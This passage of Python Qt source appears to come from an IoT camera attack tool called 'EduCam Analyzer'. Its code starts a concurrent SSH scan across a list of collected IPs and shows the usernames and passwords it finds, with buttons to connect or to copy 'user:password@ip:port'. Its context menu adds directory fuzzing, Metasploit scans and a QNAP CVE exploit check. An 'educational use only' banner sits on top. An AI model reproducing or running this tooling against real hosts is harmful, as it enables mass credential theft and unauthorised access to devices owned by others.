        layout.addRow("Port:", port_edit)
        layout.addRow("User:", user_edit)
        layout.addRow("Password:", pass_edit)
        btn_layout = QHBoxLayout()
        ext_btn = QPushButton("🔗 Open External")
        ext_btn.clicked.connect(lambda: self.launch_external_ssh(ip_edit.text(), port_edit.value(), user_edit.text(), pass_edit.text(), dlg))
        embed_btn = QPushButton("🖥 Open Embedded Tab")
        embed_btn.clicked.connect(lambda: self.launch_embedded_ssh(ip_edit.text(), port_edit.value(), user_edit.text(), pass_edit.text(), dlg))
        btn_layout.addWidget(ext_btn)
        btn_layout.addWidget(embed_btn)
        layout.addRow(btn_layout)
        dlg.exec()

    def launch_external_ssh(self, ip, port, user, pwd, dialog=None):
        if dialog: dialog.close()
        if not ip: return
        try:
            subprocess.Popen(["wt", "ssh", f"{user}@{ip}", "-p", str(port)])
            self.log(f"SSH external session opened to {ip}", "success")
            return
        except: pass
        try:
            subprocess.Popen(["putty", f"{user}@{ip}", "-P", str(port), "-pw", pwd])
            self.log(f"SSH external session (PuTTY) opened to {ip}", "success")
            return
        except:
            self.log("Could not launch external SSH client. Run ssh manually.", "warning")

    def launch_embedded_ssh(self, ip, port, user, pwd, dialog=None):
        if dialog: dialog.close()
        if not ip: return
        if not SSH_AVAILABLE:
            QMessageBox.warning(self, "paramiko missing", "Install paramiko to use embedded SSH.")
            return
        console = SshConsoleWidget(ip, port, user, pwd)
        tab_name = f"SSH {ip}"
        idx = self.filter_tabs.addTab(console, tab_name)
        self.filter_tabs.setCurrentIndex(idx)
        self.log(f"Embedded SSH console opened to {ip}", "success")

    def on_table_context_menu(self, pos):
        table = self.sender()
        row = table.rowAt(pos.y())
        if row < 0: return
        item = table.item(row, 0)
        if not item: return
        ip = item.text().split()[-1]
        menu = QMenu()
        geo_action = menu.addAction(f"🌍 Geolocate {ip}")
        geo_action.triggered.connect(lambda checked, ip=ip: self.show_geolocation_dialog(ip))
        ssh_action = menu.addAction(f"🔐 SSH to {ip}")
        ssh_action.triggered.connect(lambda checked, ip=ip: self.open_ssh_dialog())
        fuzz_action = menu.addAction(f"🔎 Fuzz Directories on {ip}")
        fuzz_action.triggered.connect(lambda checked, ip=ip: self.open_url_fuzzer(prefill_target=ip))
        vuln_action = menu.addAction(f"🛡 Metasploit Scan on {ip}")
        vuln_action.triggered.connect(lambda checked, ip=ip: self.open_metasploit_scan_on(ip))
        qnap_port = self.iot_port_spin.value() if getattr(self, 'multi_iot_mode', False) else 8080
        qnap_action = menu.addAction(f"🗄 QNAP CVE + Metasploit on {ip}")
        qnap_action.triggered.connect(
            lambda checked, ip=ip, p=qnap_port: self.check_qnap_target(ip, p))
        menu.exec(table.mapToGlobal(pos))

    # ------------------------------------------------------------------
    # Batch SSH Scan (live updating)
    # ------------------------------------------------------------------
    def start_batch_ssh_scan(self):
        ips = []
        for row in range(self.good_table.rowCount()):
            item = self.good_table.item(row, 0)
            if item:
                text = item.text()
                ip = text.split()[-1] if text else ""
                if ip: ips.append(ip)
        if not ips:
            QMessageBox.information(self, "No IPs", "No IPs in the Good tab to scan.")
            return

        self.live_ssh_dlg = QDialog(self)
        self.live_ssh_dlg.setWindowTitle("Fast SSH Scan – Live Results")
        self.live_ssh_dlg.resize(650, 450)
        layout = QVBoxLayout(self.live_ssh_dlg)

        self.live_table = QTableWidget(0, 5)
        self.live_table.setHorizontalHeaderLabels(["IP", "Username", "Password", "Action", "Copy"])
        self.live_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        layout.addWidget(self.live_table, 1)

        self.live_progress = QProgressBar()
        self.live_progress.setMaximum(len(ips))
        layout.addWidget(self.live_progress)

        btn_layout = QHBoxLayout()
        cancel_btn = QPushButton("Cancel")
        cancel_btn.clicked.connect(self.stop_ssh_scan)
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(self.live_ssh_dlg.accept)
        btn_layout.addWidget(cancel_btn)
        btn_layout.addWidget(close_btn)
        layout.addLayout(btn_layout)

        self.ssh_worker = FastSshScanWorker(ips, port=22, timeout=3, concurrency=30)
        self.ssh_worker.cred_found.connect(self.on_ssh_cred_found)
        self.ssh_worker.progress_signal.connect(self.live_progress.setValue)
        # log_signal emits (level, message); self.log expects (message, level).
        self.ssh_worker.log_signal.connect(lambda level, msg: self.log(msg, level))
        self.ssh_worker.finished_signal.connect(self.on_ssh_scan_complete)
        self.ssh_worker.status_signal.connect(self.status_label.setText)
        self.ssh_worker.start()

        self.live_ssh_dlg.show()
        self.status_label.setText("Fast SSH scanning...")
        self.log("info", f"Fast SSH scan started on {len(ips)} IPs.")

    def on_ssh_cred_found(self, cred):
        row = self.live_table.rowCount()
        self.live_table.insertRow(row)
        self.live_table.setItem(row, 0, QTableWidgetItem(cred["ip"]))
        self.live_table.setItem(row, 1, QTableWidgetItem(cred["user"]))
        self.live_table.setItem(row, 2, QTableWidgetItem(cred["password"]))
        connect_btn = QPushButton("Connect")
        connect_btn.clicked.connect(lambda checked, c=cred: self.launch_external_ssh(c["ip"], c["port"], c["user"], c["password"]))
        self.live_table.setCellWidget(row, 3, connect_btn)
        copy_btn = QPushButton("Copy")
        copy_btn.clicked.connect(lambda checked, c=cred: QApplication.clipboard().setText(f"{c['user']}:{c['password']}@{c['ip']}:{c['port']}"))
        self.live_table.setCellWidget(row, 4, copy_btn)

    def on_ssh_scan_complete(self):
        self.status_label.setText("Idle")
        self.live_progress.setValue(self.live_progress.maximum())
        self.log("info", "Fast SSH scan complete.")

    def stop_ssh_scan(self):
        if hasattr(self, 'ssh_worker') and self.ssh_worker and self.ssh_worker.isRunning():
            self.ssh_worker.stop()
            self.ssh_worker.wait()
        self.live_ssh_dlg.accept()
        self.status_label.setText("SSH scan stopped")
        self.log("warning", "SSH scan aborted by user.")

    # ------------------------------------------------------------------
    # IP Geolocation Dialog
    # ------------------------------------------------------------------
    def show_geolocation_dialog(self, ip):
        """Fetch geolocation data and show a dialog with map"""
        self.status_label.setText(f"Fetching geolocation for {ip}...")
        QApplication.processEvents()

        geo_data = self.fetch_geolocation_data(ip)
        if not geo_data:
            QMessageBox.warning(self, "Geolocation Error", f"Could not fetch geolocation data for {ip}")
            self.status_label.setText("Idle")
            return

        # Create dialog
        dialog = QDialog(self)
        dialog.setWindowTitle(f"Geolocation - {ip}")
        dialog.resize(900, 700)
        dialog.setStyleSheet("QDialog { background: #101214; color: #d8dde1; }")

        layout = QVBoxLayout(dialog)

        # Info panel
        info_widget = QWidget()
        info_layout = QGridLayout(info_widget)
        info_layout.setSpacing(10)

        row = 0
        fields = [
            ("IP Address:", geo_data.get("query", ip)),
            ("Country:", geo_data.get("country", "Unknown")),
            ("Region:", geo_data.get("regionName", "Unknown")),
            ("City:", geo_data.get("city", "Unknown")),
            ("ZIP Code:", geo_data.get("zip", "Unknown")),
            ("Latitude:", f"{geo_data.get('lat', 'N/A')}"),
            ("Longitude:", f"{geo_data.get('lon', 'N/A')}"),
            ("ISP:", geo_data.get("isp", "Unknown")),
            ("Organization:", geo_data.get("org", "Unknown")),
            ("Timezone:", geo_data.get("timezone", "Unknown")),
        ]

        for label, value in fields:
            label_widget = QLabel(label)
            label_widget.setStyleSheet("font-weight: bold; color: #00ffff;")
            value_widget = QLabel(str(value))
            value_widget.setStyleSheet("color: #a8e6cf;")
            value_widget.setWordWrap(True)
            info_layout.addWidget(label_widget, row, 0)
            info_layout.addWidget(value_widget, row, 1)
            row += 1

        info_layout.setColumnStretch(1, 1)
        layout.addWidget(info_widget)

        # Map
        map_widget = QWebEngineView()
        map_html = self.generate_map_html(geo_data)
        map_widget.setHtml(map_html)
        layout.addWidget(QLabel("Location Map:"), 0, Qt.AlignmentFlag.AlignLeft)
        layout.addWidget(map_widget, 1)

        # Buttons
        btn_layout = QHBoxLayout()
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(dialog.accept)
        copy_btn = QPushButton("Copy Details")
        copy_btn.clicked.connect(lambda: self.copy_geo_details(geo_data))
        btn_layout.addWidget(copy_btn)
        btn_layout.addStretch()
        btn_layout.addWidget(close_btn)
        layout.addLayout(btn_layout)

        dialog.exec()
        self.status_label.setText("Idle")

    def fetch_geolocation_data(self, ip):
        """Fetch geolocation data from ip-api.com"""
        try:
            url = f"http://ip-api.com/json/{ip}?fields=status,message,query,country,regionName,city,zip,lat,lon,isp,org,timezone"
            response = requests.get(url, timeout=5)
            response.raise_for_status()
            data = response.json()

            if data.get("status") == "success":
                return data
            else:
                self.log("warning", f"Geolocation API error: {data.get('message', 'Unknown error')}")
                return None
        except Exception as e:
            self.log("error", f"Failed to fetch geolocation: {str(e)}")
            return None

    def generate_map_html(self, geo_data):
        """Generate HTML for embedded Leaflet map"""
        lat = geo_data.get("lat", 0)
        lon = geo_data.get("lon", 0)
        city = geo_data.get("city", "Location")
        country = geo_data.get("country", "")

        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css" />
            <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
            <style>
                body {{ margin: 0; padding: 0; background: #101214; }}
                #map {{ position: absolute; top: 0; bottom: 0; width: 100%; }}
                .info-box {{ background: rgba(16, 18, 20, 0.9); color: #a8e6cf; padding: 10px; border-radius: 5px; border: 1px solid #00ffff; font-size: 14px; }}
            </style>
        </head>
        <body>
            <div id="map"></div>
            <script>
                var map = L.map('map').setView([{lat}, {lon}], 10);
                L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png', {{
                    attribution: '&copy; OpenStreetMap contributors',
                    maxZoom: 19
                }}).addTo(map);

                var marker = L.marker([{lat}, {lon}]).addTo(map);
                marker.bindPopup("<div class='info-box'><b>{city}, {country}</b><br/>Lat: {lat}<br/>Lon: {lon}</div>").openPopup();
            </script>
        </body>
        </html>
        """
        return html

    def copy_geo_details(self, geo_data):
        """Copy geolocation details to clipboard"""
        details = f"""IP: {geo_data.get('query', 'N/A')}
Country: {geo_data.get('country', 'N/A')}
Region: {geo_data.get('regionName', 'N/A')}
City: {geo_data.get('city', 'N/A')}
Latitude: {geo_data.get('lat', 'N/A')}
Longitude: {geo_data.get('lon', 'N/A')}
ISP: {geo_data.get('isp', 'N/A')}
Organization: {geo_data.get('org', 'N/A')}
Timezone: {geo_data.get('timezone', 'N/A')}"""

        QApplication.clipboard().setText(details)
        self.log("info", "Geolocation details copied to clipboard")

    def init_timezones_tab(self):
        self.tz_timer = QTimer(self)
        self.tz_timer.timeout.connect(self.update_timezones_table)
        self.tz_timer.start(10000)
        tz_container = QWidget()
        tz_layout = QVBoxLayout(tz_container)
        self.tz_refresh_btn = QPushButton("Refresh Times")
        self.tz_refresh_btn.clicked.connect(self.update_timezones_table)
        tz_layout.addWidget(self.tz_refresh_btn)
        self.tz_table = QTableWidget(0, 2)
        self.tz_table.setHorizontalHeaderLabels(["Country", "Current Time"])
        self.tz_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        tz_layout.addWidget(self.tz_table, 1)
        self.filter_tabs.addTab(tz_container, "9–5 Time Zones")
        self.update_timezones_table()

    def update_timezones_table(self):
        if not hasattr(self, "tz_table"): return
        self.tz_table.setRowCount(0)
        rows = []
        for country_name, code in COUNTRY_CODES.items():
            try:
                tz_names = pytz.country_timezones(code)
                if not tz_names: continue
                tz = pytz.timezone(tz_names[0])
                now = datetime.now(tz)
                hour = now.hour
                if 9 <= hour < 17:
                    flag = FLAG_EMOJI.get(code, "")
                    display_name = f"{flag} {country_name}" if flag else country_name
                    rows.append((display_name, now.strftime("%H:%M:%S")))
            except: continue
        for country_display, time_str in rows:
            row = self.tz_table.rowCount()
            self.tz_table.insertRow(row)
            self.tz_table.setItem(row, 0, QTableWidgetItem(country_display))
            self.tz_table.setItem(row, 1, QTableWidgetItem(time_str))

    def show_timezones_tab(self):
        # Inserting the "Port 22 Open" tab before Favorites shifted every
        # subsequent tab index by +1, so this fixed index moves 5 -> 6 to keep
        # selecting the same tab it did before.
        self.filter_tabs.setCurrentIndex(6)
        try:
            self.update_timezones_table()
        except Exception as e:
            self.log(f"Failed to update timezones: {e}", "error")


# --- Run ---
def print_banner():
    try:
        import pyfiglet
        art = pyfiglet.figlet_format("IoT CAMERA\nANALYZER", font="slant")
    except Exception:
        art = "IoT CAMERA ANALYZER"

    gradient = [Fore.CYAN, Fore.BLUE, Fore.MAGENTA, Fore.RED, Fore.YELLOW, Fore.GREEN]
    lines = [line for line in art.split("\n") if line.strip()]
    width = max((len(line) for line in lines), default=0)

    print()
    print(Fore.CYAN + Style.BRIGHT + "=" * width)
    for i, line in enumerate(lines):
        print(gradient[i % len(gradient)] + Style.BRIGHT + line)
    print(Fore.CYAN + Style.BRIGHT + "=" * width)
    print(Fore.GREEN + Style.BRIGHT + "  [ EduCam Analyzer + AVTech + IP Scanner + Vuln Scanner + SSH (Modular) ]".center(width))
    print(Fore.WHITE + "  Educational Use Only -- Authorized Security Testing".center(width))
    print(Fore.CYAN + Style.BRIGHT + "=" * width)
    print()


def _global_exception_hook(exc_type, exc_value, exc_traceback):
    try:
        if 'window' in globals() and hasattr(globals()['window'], 'cleanup_on_crash'):
            globals()['window'].cleanup_on_crash(exc_type, exc_value, exc_traceback)
    except Exception:
        pass
    sys.__excepthook__(exc_type, exc_value, exc_traceback)

if __name__ == "__main__":
    print_banner()
    sys.excepthook = _global_exception_hook
    if sys.platform == "win32":
        # Without a distinct AppUserModelID, Windows groups this process under
        # python.exe's own taskbar identity and shows the Python logo there
        # instead of the window icon set below.
        try:
            import ctypes
            ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(
                "NinjaLab.EduCamAnalyzer.1.2")
        except Exception:
            pass
    app = QApplication(sys.argv)
    app.setApplicationName("EduCam Analyzer + AVTech + IP Scanner + Vuln Scanner + SSH (Modular)")
    _app_icon_path = os.path.join(
        sys._MEIPASS if hasattr(sys, "_MEIPASS") else os.path.abspath("."),
        "Images", "icon.ico")
    if os.path.exists(_app_icon_path):
        app.setWindowIcon(QIcon(_app_icon_path))
    window = EduCamAnalyzer()
    window.init_timezones_tab()
    window.show()
    sys.exit(app.exec())
